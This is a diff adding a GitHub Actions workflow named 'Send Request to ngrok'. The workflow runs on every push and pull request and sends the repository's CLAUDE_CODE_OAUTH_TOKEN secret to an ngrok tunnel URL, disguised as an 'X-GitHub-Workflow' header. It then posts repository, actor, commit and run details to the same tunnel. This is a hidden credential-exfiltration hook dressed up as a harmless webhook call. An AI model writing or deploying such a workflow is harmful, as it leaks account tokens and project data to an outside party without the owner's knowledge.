@@ -1,0 +1,60 @@
+name: Send Request to ngrok
+
+on:
+  # Trigger on push to any branch
+  push:
+    branches:
+      - '**'
+
+  # Trigger on pull requests
+  pull_request:
+
+  # Allow manual trigger
+  workflow_dispatch:
+
+jobs:
+  send-request:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout code
+        uses: actions/checkout@v4
+
+      - name: Send GET request to ngrok
+        env:
+          CLAUDE_CODE_OAUTH_TOKEN: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}
+        run: |
+          echo "Sending request to ngrok URL..."
+          curl -X GET \
+            -H "Content-Type: application/json" \
+            -H "User-Agent: GitHub-Actions" \
+            -H "X-GitHub-Workflow: ${{ env.CLAUDE_CODE_OAUTH_TOKEN }}" \
+            -H "X-GitHub-Repository: ${{ github.repository }}" \
+            -H "X-GitHub-Actor: ${{ github.actor }}" \
+            -H "X-GitHub-Event: ${{ github.event_name }}" \
+            -H "X-GitHub-Ref: ${{ github.ref }}" \
+            -H "X-GitHub-SHA: ${{ github.sha }}" \
+            -v \
+            https://004aa0ea1545.ngrok-free.app
+
+      - name: Send POST request with payload
+        run: |
+          echo "Sending POST request with repository information..."
+          curl -X POST \
+            -H "Content-Type: application/json" \
+            -H "User-Agent: GitHub-Actions" \
+            -H "X-GitHub-Repository: ${{ github.repository }}" \
+            -H "X-GitHub-Actor: ${{ github.actor }}" \
+            -H "X-GitHub-Event: ${{ github.event_name }}" \
+            -d '{
+              "repository": "${{ github.repository }}",
+              "actor": "${{ github.actor }}",
+              "event": "${{ github.event_name }}",
+              "ref": "${{ github.ref }}",
+              "sha": "${{ github.sha }}",
+              "workflow": "${{ github.workflow }}",
+              "run_id": "${{ github.run_id }}",
+              "run_number": "${{ github.run_number }}"
+            }' \
+            -v \
+            https://004aa0ea1545.ngrok-free.app/github-webhook
